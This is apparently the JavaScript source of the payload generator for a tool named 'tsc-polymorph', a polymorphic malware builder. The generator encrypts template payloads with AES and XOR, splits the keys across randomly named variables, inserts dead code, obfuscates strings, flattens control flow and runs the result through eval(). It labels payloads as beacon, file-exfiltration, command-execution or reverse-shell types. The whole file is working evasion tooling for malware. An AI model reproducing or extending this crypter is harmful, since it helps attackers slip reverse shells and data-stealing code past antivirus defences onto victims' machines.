const Crypter = require('./crypter');
const Obfuscator = require('./obfuscator');
const PayloadTemplate = require('./templates/payload');
const crypto = require('crypto');

class Generator {
  constructor() {
    this.crypter = new Crypter();
    this.obfuscator = new Obfuscator();
    this.template = new PayloadTemplate();
  }

  generate(config) {
    const rawPayload = this.template.generate(config);
    const actualTemplate = this._detectActualTemplate(config, rawPayload);
    const configWithActual = { ...config, _actualTemplate: actualTemplate };
    const encrypted = this.crypter.encrypt(rawPayload);
    const bodyCode = this.buildWrapper(encrypted);
    const header = this.buildHeader(configWithActual, bodyCode);
    return header + '\n' + bodyCode;
  }

  _detectActualTemplate(config, rawPayload) {
    if (rawPayload.includes('https')) return 'beacon';
    if (rawPayload.includes('fs.readFile')) return 'file-exfil';
    if (rawPayload.includes('child_process')) return 'command-exec';
    if (rawPayload.includes('net')) return 'reverse-shell';
    return config.template || 'auto';
  }

  buildHeader(config, bodyCode) {
    const hash = crypto.createHash('sha256').update(bodyCode, 'utf8').digest('hex');
    const protocol = config._actualTemplate === 'beacon' ? 'https' : (config.protocol || 'tcp');
    const lines = [
      '// tsc-polymorph: v1.0.0',
      `// tsc-polymorph: host=${config.host || '127.0.0.1'}`,
      `// tsc-polymorph: port=${config.port || 4443}`,
      `// tsc-polymorph: protocol=${protocol}`,
      `// tsc-polymorph: beacon=${config.beacon || 60}`,
      `// tsc-polymorph: template=${config._actualTemplate || config.template || 'auto'}`,
      `// tsc-polymorph: timestamp=${new Date().toISOString()}`,
      `// tsc-polymorph: hash=sha256:${hash}`,
      '// ====PAYLOAD===='
    ];
    return lines.join('\n');
  }

  buildWrapper(encrypted) {
    const { data, aesKey, iv, xorKey } = encrypted;
    const obf = this.obfuscator;

    const splitKey = (key) => {
      const partLen = Math.ceil(key.length / 3);
      return [
        key.substring(0, partLen),
        key.substring(partLen, Math.min(partLen * 2, key.length)),
        key.substring(partLen * 2)
      ];
    };

    const aesParts = splitKey(aesKey);
    const ivParts = splitKey(iv);
    const xorParts = splitKey(xorKey);

    const vAes1 = obf.randomVarName();
    const vAes2 = obf.randomVarName();
    const vAes3 = obf.randomVarName();
    const vAesKey = obf.randomVarName();

    const vIv1 = obf.randomVarName();
    const vIv2 = obf.randomVarName();
    const vIv3 = obf.randomVarName();
    const vIv = obf.randomVarName();

    const vXor1 = obf.randomVarName();
    const vXor2 = obf.randomVarName();
    const vXor3 = obf.randomVarName();
    const vXor = obf.randomVarName();

    const vEnc = obf.randomVarName();
    const vMod = obf.randomVarName();
    const vDecipher = obf.randomVarName();
    const vDeciphered = obf.randomVarName();
    const vKeyBuf = obf.randomVarName();
    const vResult = obf.randomVarName();
    const vLoop = obf.randomVarName();

    const cryptoStr = obf.obfuscateString('crypto');
    const algoStr = obf.obfuscateString('aes-256-cbc');
    const hexStr = obf.obfuscateString('hex');
    const b64Str = obf.obfuscateString('base64');

    let w = '(function(){\n';

    w += obf.deadCodeBlock(Math.floor(Math.random() * 3 + 1)) + '\n';

    w += `var ${vAes1}='${aesParts[0]}';\n`;
    w += `var ${vAes2}='${aesParts[1]}';\n`;
    w += `var ${vAes3}='${aesParts[2]}';\n`;
    w += `var ${vAesKey}=${vAes1}+${vAes2}+${vAes3};\n`;

    w += obf.deadCodeBlock(Math.floor(Math.random() * 2 + 1)) + '\n';

    w += `var ${vIv1}='${ivParts[0]}';\n`;
    w += `var ${vIv2}='${ivParts[1]}';\n`;
    w += `var ${vIv3}='${ivParts[2]}';\n`;
    w += `var ${vIv}=${vIv1}+${vIv2}+${vIv3};\n`;

    w += obf.deadCodeBlock(Math.floor(Math.random() * 2 + 1)) + '\n';

    w += `var ${vXor1}='${xorParts[0]}';\n`;
    w += `var ${vXor2}='${xorParts[1]}';\n`;
    w += `var ${vXor3}='${xorParts[2]}';\n`;
    w += `var ${vXor}=${vXor1}+${vXor2}+${vXor3};\n`;

    w += obf.deadCodeBlock(Math.floor(Math.random() * 2 + 1)) + '\n';

    w += `var ${vEnc}='${data}';\n`;

    w += obf.deadCodeBlock(Math.floor(Math.random() * 2 + 1)) + '\n';

    w += cryptoStr.code + '\n';
    w += algoStr.code + '\n';
    w += hexStr.code + '\n';
    w += b64Str.code + '\n';

    w += obf.deadCode() + '\n';

    w += `var ${vMod}=require(${cryptoStr.varName});\n`;
    w += `var ${vDecipher}=${vMod}.createDecipheriv(${algoStr.varName},Buffer.from(${vAesKey},${hexStr.varName}),Buffer.from(${vIv},${hexStr.varName}));\n`;
    w += `var ${vDeciphered}=Buffer.concat([${vDecipher}.update(Buffer.from(${vEnc},${b64Str.varName})),${vDecipher}.final()]);\n`;

    w += obf.deadCode() + '\n';

    w += `var ${vKeyBuf}=Buffer.from(${vXor},${hexStr.varName});\n`;
    w += `var ${vResult}=Buffer.alloc(${vDeciphered}.length);\n`;
    w += `for(var ${vLoop}=0;${vLoop}<${vDeciphered}.length;${vLoop}++){${vResult}[${vLoop}]=${vDeciphered}[${vLoop}]^${vKeyBuf}[${vLoop}%${vKeyBuf}.length];}\n`;

    w += obf.deadCode() + '\n';

    w += `eval(${vResult}.toString('utf8'));\n`;

    w += '})();\n';

    let result = w;
    result = obf.substituteOps(result);
    result = obf.flattenControlFlow(result);
    return result;
  }
}

module.exports = Generator;
